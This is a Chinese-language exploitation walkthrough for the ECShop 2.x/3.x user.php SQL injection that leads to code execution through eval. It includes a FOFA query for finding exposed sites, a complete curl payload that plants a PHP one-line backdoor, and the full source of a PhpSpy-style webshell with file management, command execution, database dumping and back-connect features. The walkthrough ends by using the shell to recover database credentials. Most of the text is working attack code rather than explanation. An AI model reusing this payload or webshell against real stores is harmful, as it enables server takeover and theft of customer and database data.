Ecshop是一款B2C独立网店系统，基于PHP语言和MySQL构架开发的跨平台开源程序，最新版本为3.6.0。

该漏洞影响ECShop 2.x和3.x版本，是一个典型的“二次漏洞”，通过user.php文件中display()函数的模板变量可控，从而造成SQL注入漏洞，而后又通过SQL注入漏洞将恶意代码注入到危险函数eval中，从而实现了任意代码执行。

**01**

**—**

**Fofo语法及环境搭建**



**Fofo语法：**

body="ECSHOP v2.7.3"

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwuSVbicdujnDzOq1kGicoBB34EPJPdc9wS0AZs6YSsHvibseibDiaGCY7YAA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**环境搭建：**

1、关闭centos防火墙并禁止开机启动：

- 

```
systemctl disable --now firewalld
```

2、关闭selinux，永久关闭需要修改配置文件：

- 

```
sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config
```

3、重新启动：

- 

```
reboot
```

4、按照LAMP环境：

- 

```
yum -y install httpd mariadb-server mariadb php php-mysql php-gd php-mbstring
```

5、启动httpd和MariaDB服务：

- 

```
systemctl enable httpd --now
```

- 

```
systemctl enable mariadb --now
```

6、设置数据库密码：

- 

```
mysqladmin -u root password "Admin@123"
```

7、上传ecshop到linux主机并解压到网站目录下：

- 

```
unzip ecshop.zip
```

- 

```
mv ecshop/* /var/www/html/
```

- 

```
chown -R apache:apache /var/www/html/
```

8、访问靶场地址开始安装：

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwwqCpibgCkrhfB0G95xTTqS0sftJ6Shey7bicR1RwtY7u6pfpiaaRpFnmA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwqOM0cOzRH7pnf9zIiap2x8DwMMW8Y14ATDQF07NicUyAZxIvP6XcuKWA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwtx8oy5ZaxEXrL7zkLugRRrnohf3D2jmolSZKDFHZw7hLES52MppiaKA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwRtHeqUFvCFlHh8n3zobZibslA0iaNHEevnIftjlIYk9WLgrdzh4ZqG2A/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwwsxcQNeoiaPRzzba7ibpfxaHibmUTn1hDS5qI3aCiaTbcgjqCYicJwB8Fdg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

至此安装完毕。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwcmToUvgELIyR5cK3OXWvPDHpY4CzQRWUibLCUU7OD2yhotoUGOYxQtw/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)





**02**

**—**

**漏洞利用及复现过程**



**S1：构造payload写入一句话并使用蚁剑连接上传webshell，**

- 
- 
- 

```
curl http://192.168.127.160/user.php \-d "action=login&vulnspy=eval/**/(base64_decode(ZmlsZV9wdXRfY29udGVudHMoJ3Z1bG5zcHkucGhwJywnPD9waHAgZXZhbCgkX1JFUVVFU1RbdnVsbnNweV0pOycpOw));exit;" \-H 'Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:"num";s:207:"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:2:"id";s:9:"'"'"' union/*";s:4:"name";s:3:"ads";}45ea207d7a2b68c49582d2d22adf953a'
```

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwuS3AGonVAh8VBiadrzzicdNZx1kp7dkqxYXtg5CvndvJXWWMMHVcQokA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



**S2：使用蚁剑进行连接，**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwIKxOq3voqj6lBrcaFuWPXwslHINUtAich5Ep5hjEe7gATPF66K0cIjw/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwSBicicj8bib3zgT4Sh9vQytiaibULOL4Z5Vibqv0nU8icvnMeWIiaiaZl5JEDoQ/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



**S3：编写查询数据库，任意代码执行，修改数据库value值的webshell2，**



```
<?php
/*****************************************************************************
===================== 请误用于非法用途，造成一切后果与本人无关。====================
====

*****************************************************************************/
error_reporting(7);@set_magic_quotes_runtime(0);ob_start();$mtime = explode(' ', microtime());$starttime = $mtime[1] + $mtime[0];define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');//define('IS_WIN', strstr(PHP_OS, 'WIN') ? 1 : 0 );define('IS_WIN', DIRECTORY_SEPARATOR == '\\');define('IS_COM', class_exists('COM') ? 1 : 0 );define('IS_GPC', get_magic_quotes_gpc());$dis_func = get_cfg_var('disable_functions');define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );@set_time_limit(0);
foreach(array('_GET','_POST') as $_request) {	foreach($$_request as $_key => $_value) {		if ($_key{0} != '_') {			if (IS_GPC) {				$_value = s_array($_value);			}			$$_key = $_value;		}	}}
/*===================== 程序配置 =====================*/$admin = array();// 是否需要密码验证, true 为需要验证, false 为直接进入.下面选项则无效$admin['check'] = true;// 如果需要密码验证,请修改登陆密码$admin['pass']  = 'Zero';
//如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认// cookie 前缀$admin['cookiepre'] = '';// cookie 作用域$admin['cookiedomain'] = '';// cookie 作用路径$admin['cookiepath'] = '/';// cookie 有效期$admin['cookielife'] = 86400;/*===================== 配置结束 =====================*/
if ($charset == 'utf8') {	header("content-Type: text/html; charset=utf-8");} elseif ($charset == 'big5') {	header("content-Type: text/html; charset=big5");} elseif ($charset == 'gbk') {	header("content-Type: text/html; charset=gbk");} elseif ($charset == 'latin1') {	header("content-Type: text/html; charset=iso-8859-2");}
$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];$timestamp = time();
/*===================== 身份验证 =====================*/if ($action == "logout") {	scookie('phpspypass', '', -86400 * 365);	p('<meta http-equiv="refresh" content="1;URL='.$self.'">');	p('<a style="font:12px Verdana" href="'.$self.'">Success</a>');	exit;}if($admin['check']) {	if ($doing == 'login') {		if ($admin['pass'] == $password) {			scookie('phpspypass', $password);			p('<meta http-equiv="refresh" content="1;URL='.$self.'">');			p('<a style="font:12px Verdana" href="'.$self.'">Success</a>');			exit;		}	}	if ($_COOKIE['phpspypass']) {		if ($_COOKIE['phpspypass'] != $admin['pass']) {			loginpage();		}	} else {		loginpage();	}}/*===================== 验证结束 =====================*/
$errmsg = '';
// 查看PHPINFOif ($action == 'phpinfo') {	if (IS_PHPINFO) {		phpinfo();	} else {		$errmsg = 'phpinfo() function has non-permissible';	}}
// 下载文件if ($doing == 'downfile' && $thefile) {	if (!@file_exists($thefile)) {		$errmsg = 'The file you want Downloadable was nonexistent';	} else {		$fileinfo = pathinfo($thefile);		header('Content-type: application/x-'.$fileinfo['extension']);		header('Content-Disposition: attachment; filename='.$fileinfo['basename']);		header('Content-Length: '.filesize($thefile));		@readfile($thefile);		exit;	}}
// 直接下载备份数据库if ($doing == 'backupmysql' && !$saveasfile) {	dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);	$table = array_flip($table);	$result = q("SHOW tables");	if (!$result) p('<h2>'.mysql_error().'</h2>');	$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');	header('Content-type: application/unknown');	header('Content-Disposition: attachment; filename='.$filename);	$mysqldata = '';	while ($currow = mysql_fetch_array($result)) {		if (isset($table[$currow[0]])) {			$mysqldata .= sqldumptable($currow[0]);		}	}	mysql_close();	exit;}
// 通过MYSQL下载文件if($doing=='mysqldown'){	if (!$dbname) {		$errmsg = 'Please input dbname';	} else {		dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);		if (!file_exists($mysqldlfile)) {			$errmsg = 'The file you want Downloadable was nonexistent';		} else {			$result = q("select load_file('$mysqldlfile');");			if(!$result){				q("DROP TABLE IF EXISTS tmp_angel;");				q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");				//用时间戳来表示截断,避免出现读取自身或包含__angel_1111111111_eof__的文件时不完整的情况				q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");				$result = q("select content from tmp_angel");				q("DROP TABLE tmp_angel");			}			$row = @mysql_fetch_array($result);			if (!$row) {				$errmsg = 'Load file failed '.mysql_error();			} else {				$fileinfo = pathinfo($mysqldlfile);				header('Content-type: application/x-'.$fileinfo['extension']);				header('Content-Disposition: attachment; filename='.$fileinfo['basename']);				header("Accept-Length: ".strlen($row[0]));				echo $row[0];				exit;			}		}	}}
?><html><head><meta http-equiv="Content-Type" content="text/html; charset=gbk"><title><?php echo str_replace('.','','P.h.p.S.p.y');?></title><style type="text/css">body,td{font: 12px Arial,Tahoma;line-height: 16px;}.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}a {color: #00f;text-decoration:underline;}a:hover{color: #f00;text-decoration:none;}.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}.head td span{font-weight:normal;}form{margin:0;padding:0;}h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}ul.info li{margin:0;color:#444;line-height:24px;height:24px;}u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}</style><script type="text/javascript">function CheckAll(form) {	for(var i=0;i<form.elements.length;i++) {		var e = form.elements[i];		if (e.name != 'chkall')		e.checked = form.chkall.checked;    }}function $(id) {	return document.getElementById(id);}function goaction(act){	$('goaction').action.value=act;	$('goaction').submit();}</script></head><body style="margin:0;table-layout:fixed; word-break:break-all"><table width="100%" border="0" cellpadding="0" cellspacing="0">	<tr class="head">		<td><span style="float:right;"><a href="http://www.4ngel.net" target="_blank"><?php echo str_replace('.','','P.h.p.S.p.y');?> Ver: 2008</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>	</tr>	<tr class="alt1">		<td><span style="float:right;">Safe Mode:<?php echo getcfg('safe_mode');?></span>			<a href="javascript:goaction('logout');">Logout</a> | 			<a href="javascript:goaction('file');">File Manager</a> | 			<a href="javascript:goaction('sqladmin');">MySQL Manager</a> | 			<a href="javascript:goaction('sqlfile');">MySQL Upload &amp; Download</a> | 			<a href="javascript:goaction('shell');">Execute Command</a> | 			<a href="javascript:goaction('phpenv');">PHP Variable</a> | 			<a href="javascript:goaction('eval');">Eval PHP Code</a>			<?php if (!IS_WIN) {?> | <a href="javascript:goaction('backconnect');">Back Connect</a><?php }?>		</td>	</tr></table><table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td><?php
formhead(array('name'=>'goaction'));makehide('action');formfoot();
$errmsg && m($errmsg);
// 获取当前路径!$dir && $dir = '.';$nowpath = getPath(SA_ROOT, $dir);if (substr($dir, -1) != '/') {	$dir = $dir.'/';}$uedir = ue($dir);
if (!$action || $action == 'file') {
	// 判断读写情况	$dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';
	// 删除目录	if ($doing == 'deldir' && $thefile) {		if (!file_exists($thefile)) {			m($thefile.' directory does not exist');		} else {			m('Directory delete '.(deltree($thefile) ? basename($thefile).' success' : 'failed'));		}	}
	// 创建目录	elseif ($newdirname) {		$mkdirs = $nowpath.$newdirname;		if (file_exists($mkdirs)) {			m('Directory has already existed');		} else {			m('Directory created '.(@mkdir($mkdirs,0777) ? 'success' : 'failed'));			@chmod($mkdirs,0777);		}	}
	// 上传文件	elseif ($doupfile) {		m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));	}
	// 编辑文件	elseif ($editfilename && $filecontent) {		$fp = @fopen($editfilename,'w');		m('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));		@fclose($fp);	}
	// 编辑文件属性	elseif ($pfile && $newperm) {		if (!file_exists($pfile)) {			m('The original file does not exist');		} else {			$newperm = base_convert($newperm,8,10);			m('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : 'failed'));		}	}
	// 改名	elseif ($oldname && $newfilename) {		$nname = $nowpath.$newfilename;		if (file_exists($nname) || !file_exists($oldname)) {			m($nname.' has already existed or original file does not exist');		} else {			m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : 'failed'));		}	}
	// 复制文件	elseif ($sname && $tofile) {		if (file_exists($tofile) || !file_exists($sname)) {			m('The goal file has already existed or original file does not exist');		} else {			m(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($tofile).' success' : 'failed'));		}	}
	// 克隆时间	elseif ($curfile && $tarfile) {		if (!@file_exists($curfile) || !@file_exists($tarfile)) {			m('The goal file has already existed or original file does not exist');		} else {			$time = @filemtime($tarfile);			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));		}	}
	// 自定义时间	elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {		if (!@file_exists($curfile)) {			m(basename($curfile).' does not exist');		} else {			$time = strtotime("$year-$month-$day $hour:$minute:$second");			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));		}	}
	// 打包下载	elseif($doing == 'downrar') {		if ($dl) {			$dfiles='';			foreach ($dl as $filepath => $value) {				$dfiles.=$filepath.',';			}			$dfiles=substr($dfiles,0,strlen($dfiles)-1);			$dl=explode(',',$dfiles);			$zip=new PHPZip($dl);			$code=$zip->out;			header('Content-type: application/octet-stream');			header('Accept-Ranges: bytes');			header('Accept-Length: '.strlen($code));			header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');			echo $code;			exit;		} else {			m('Please select file(s)');		}	}
	// 批量删除文件	elseif($doing == 'delfiles') {		if ($dl) {			$dfiles='';			$succ = $fail = 0;			foreach ($dl as $filepath => $value) {				if (@unlink($filepath)) {					$succ++;				} else {					$fail++;				}			}			m('Deleted file have finished，choose '.count($dl).' success '.$succ.' fail '.$fail);		} else {			m('Please select file(s)');		}	}
	//操作完毕	formhead(array('name'=>'createdir'));	makehide('newdirname');	makehide('dir',$nowpath);	formfoot();	formhead(array('name'=>'fileperm'));	makehide('newperm');	makehide('pfile');	makehide('dir',$nowpath);	formfoot();	formhead(array('name'=>'copyfile'));	makehide('sname');	makehide('tofile');	makehide('dir',$nowpath);	formfoot();	formhead(array('name'=>'rename'));	makehide('oldname');	makehide('newfilename');	makehide('dir',$nowpath);	formfoot();	formhead(array('name'=>'fileopform'));	makehide('action');	makehide('opfile');	makehide('dir');	formfoot();
	$free = @disk_free_space($nowpath);	!$free && $free = 0;	$all = @disk_total_space($nowpath);	!$all && $all = 0;	$used = $all-$free;	$used_percent = @round(100/($all/$free),2);	p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.$used_percent.'%)</h2>');
?><table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">  <form action="" method="post" id="godir" name="godir">  <tr>    <td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>	<td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:100%;margin:0 8px;"></td>    <td nowrap><input class="bt" value="GO" type="submit"></td>  </tr>  </form></table><script type="text/javascript">function createdir(){	var newdirname;	newdirname = prompt('Please input the directory name:', '');	if (!newdirname) return;	$('createdir').newdirname.value=newdirname;	$('createdir').submit();}function fileperm(pfile){	var newperm;	newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');	if (!newperm) return;	$('fileperm').newperm.value=newperm;	$('fileperm').pfile.value=pfile;	$('fileperm').submit();}function copyfile(sname){	var tofile;	tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');	if (!tofile) return;	$('copyfile').tofile.value=tofile;	$('copyfile').sname.value=sname;	$('copyfile').submit();}function rename(oldname){	var newfilename;	newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');	if (!newfilename) return;	$('rename').newfilename.value=newfilename;	$('rename').oldname.value=oldname;	$('rename').submit();}function dofile(doing,thefile,m){	if (m && !confirm(m)) {		return;	}	$('filelist').doing.value=doing;	if (thefile){		$('filelist').thefile.value=thefile;	}	$('filelist').submit();}function createfile(nowpath){	var filename;	filename = prompt('Please input the file name:', '');	if (!filename) return;	opfile('editfile',nowpath + filename,nowpath);}function opfile(action,opfile,dir){	$('fileopform').action.value=action;	$('fileopform').opfile.value=opfile;	$('fileopform').dir.value=dir;	$('fileopform').submit();}function godir(dir,view_writable){	if (view_writable) {		$('godir').view_writable.value=1;	}	$('godir').dir.value=dir;	$('godir').submit();}</script>  <?php	tbhead();	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data"><tr class="alt1"><td colspan="7" style="padding:5px;">');	p('<div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="'.$dir.'" type="hidden" /><input name="dir" value="'.$dir.'" type="hidden" /></div>');	p('<a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');">WebRoot</a>');	if ($view_writable) {		p(' | <a href="javascript:godir(\''.$nowpath.'\');">View All</a>');	} else {		p(' | <a href="javascript:godir(\''.$nowpath.'\',\'1\');">View Writable</a>');	}	p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\''.$nowpath.'\');">Create File</a>');	if (IS_WIN && IS_COM) {		$obj = new COM('scripting.filesystemobject');		if ($obj && is_object($obj)) {			$DriveTypeDB = array(0 => 'Unknow',1 => 'Removable',2 => 'Fixed',3 => 'Network',4 => 'CDRom',5 => 'RAM Disk');			foreach($obj->Drives as $drive) {				if ($drive->DriveType == 2) {					p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Size:'.sizecount($drive->TotalSize).'&#13;Free:'.sizecount($drive->FreeSpace).'&#13;Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');				} else {					p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');				}			}		}	}
	p('</td></tr></form>');
	p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
	//查看所有可写文件和目录	$dirdata=array();	$filedata=array();
	if ($view_writable) {		$dirdata = GetList($nowpath);	} else {		// 目录列表		$dirs=@opendir($dir);		while ($file=@readdir($dirs)) {			$filepath=$nowpath.$file;			if(@is_dir($filepath)){				$dirdb['filename']=$file;				$dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));				$dirdb['dirchmod']=getChmod($filepath);				$dirdb['dirperm']=getPerms($filepath);				$dirdb['fileowner']=getUser($filepath);				$dirdb['dirlink']=$nowpath;				$dirdb['server_link']=$filepath;				$dirdb['client_link']=ue($filepath);				$dirdata[]=$dirdb;			} else {						$filedb['filename']=$file;				$filedb['size']=sizecount(@filesize($filepath));				$filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));				$filedb['filechmod']=getChmod($filepath);				$filedb['fileperm']=getPerms($filepath);				$filedb['fileowner']=getUser($filepath);				$filedb['dirlink']=$nowpath;				$filedb['server_link']=$filepath;				$filedb['client_link']=ue($filepath);				$filedata[]=$filedb;			}		}// while		unset($dirdb);		unset($filedb);		@closedir($dirs);	}	@sort($dirdata);	@sort($filedata);	$dir_i = '0';	foreach($dirdata as $key => $dirdb){		if($dirdb['filename']!='..' && $dirdb['filename']!='.') {			$thisbg = bg();			p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');			p('<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>');			p('<td><a href="javascript:godir(\''.$dirdb['server_link'].'\');">'.$dirdb['filename'].'</a></td>');			p('<td nowrap>'.$dirdb['mtime'].'</td>');			p('<td nowrap>--</td>');			p('<td nowrap>');			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirchmod'].'</a> / ');			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirperm'].'</a>'.$dirdb['fileowner'].'</td>');			p('<td nowrap><a href="javascript:dofile(\'deldir\',\''.$dirdb['server_link'].'\',\'Are you sure will delete '.$dirdb['filename'].'? \\n\\nIf non-empty directory, will be delete all the files.\')">Del</a> | <a href="javascript:rename(\''.$dirdb['server_link'].'\');">Rename</a></td>');			p('</tr>');			$dir_i++;		} else {			if($dirdb['filename']=='..') {				p('<tr class='.bg().'>');				p('<td align="center"><font face="Wingdings 3" size=4>=</font></td><td nowrap colspan="5"><a href="javascript:godir(\''.getUpPath($nowpath).'\');">Parent Directory</a></td>');				p('</tr>');			}		}	}
	p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>');	p('<form id="filelist" name="filelist" action="'.$self.'" method="post">');	makehide('action','file');	makehide('thefile');	makehide('doing');	makehide('dir',$nowpath);	$file_i = '0';	foreach($filedata as $key => $filedb){		if($filedb['filename']!='..' && $filedb['filename']!='.') {			$fileurl = str_replace(SA_ROOT,'',$filedb['server_link']);			$thisbg = bg();			p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');			p('<td width="2%" nowrap><input type="checkbox" value="1" name="dl['.$filedb['server_link'].']"></td>');			p('<td><a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a></td>');			p('<td nowrap>'.$filedb['mtime'].'</td>');			p('<td nowrap>'.$filedb['size'].'</td>');			p('<td nowrap>');			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['filechmod'].'</a> / ');			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['fileperm'].'</a>'.$filedb['fileowner'].'</td>');			p('<td nowrap>');			p('<a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');">Down</a> | ');			p('<a href="javascript:copyfile(\''.$filedb['server_link'].'\');">Copy</a> | ');			p('<a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Edit</a> | ');			p('<a href="javascript:rename(\''.$filedb['server_link'].'\');">Rename</a> | ');			p('<a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Time</a>');			p('</td></tr>');			$file_i++;		}	}	p('<tr class="'.bg().'"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">Packing download selected</a> - <a href="javascript:dofile(\'delfiles\');">Delete selected</a></td><td colspan="4" align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');	p('</form></table>');}// end dir
elseif ($action == 'sqlfile') {	if($doing=="mysqlupload"){		$file = $_FILES['uploadfile'];		$filename = $file['tmp_name'];		if (file_exists($savepath)) {			m('The goal file has already existed');		} else {			if(!$filename) {				m('Please choose a file');			} else {				$fp=@fopen($filename,'r');				$contents=@fread($fp, filesize($filename));				@fclose($fp);				$contents = bin2hex($contents);				if(!$upname) $upname = $file['name'];				dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);				$result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");				m($result ? 'Upload success' : 'Upload has failed: '.mysql_error());			}		}	}?><script type="text/javascript">function mysqlfile(doing){	if(!doing) return;	$('doing').value=doing;	$('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;	$('mysqlfile').dbport.value=$('dbinfo').dbport.value;	$('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;	$('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;	$('mysqlfile').dbname.value=$('dbinfo').dbname.value;	$('mysqlfile').charset.value=$('dbinfo').charset.value;	$('mysqlfile').submit();}</script><?php	!$dbhost && $dbhost = 'localhost';	!$dbuser && $dbuser = 'root';	!$dbport && $dbport = '3306';	$charsets = array(''=>'Default','gbk'=>'GBK', 'big5'=>'Big5', 'utf8'=>'UTF-8', 'latin1'=>'Latin1');	formhead(array('title'=>'MYSQL Information','name'=>'dbinfo'));	makehide('action','sqlfile');	p('<p>');	p('DBHost:');	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));	p(':');	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));	p('DBUser:');	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));	p('DBPass:');	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));	p('DBName:');	makeinput(array('name'=>'dbname','size'=>15,'value'=>$dbname));	p('DBCharset:');	makeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));	p('</p>');	formfoot();	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile">');	p('<h2>Upload file</h2>');	p('<p><b>This operation the DB user must has FILE privilege</b></p>');	p('<p>Save path(fullpath): <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');	p('<h2>Download file</h2>');	p('<p>File: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');	makehide('dbhost');	makehide('dbport');	makehide('dbuser');	makehide('dbpass');	makehide('dbname');	makehide('charset');	makehide('doing');	makehide('action','sqlfile');	p('</form>');}
?>
```



**S4：上传webshell2，**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwXYad40P2xsm2RWIaW99SIWBAAS0BCyt5jLDbgQZwLllPqwzVLgvr6A/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



**S5：在网页中打开上传webshell2的地址：**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwMCClzxlpG4Ko4CXTqhCC7hDbvek3OPT8G71miagSFVia0pycocdoC1aA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwD5o7uxVibNbmiaViaiamTyODYicr6aiaWwz9SickrhIaPCgxMVYiab1lamV1ug/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)



**S6：获取数据库密码，**

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwZAqWDNgKobuoLR7oxGLleJroKnhwuWtjL8LQZIvDpErF5akyL9sRRw/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/MicZ6Q9ZW0xCxfoia14ZrJ6AMSs5gyjaQwcEnYTic3zOTpPQYVEJEbIkCgpiaxk33vIoQ3HplsAbtXcsoS4pmz3zFQ/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

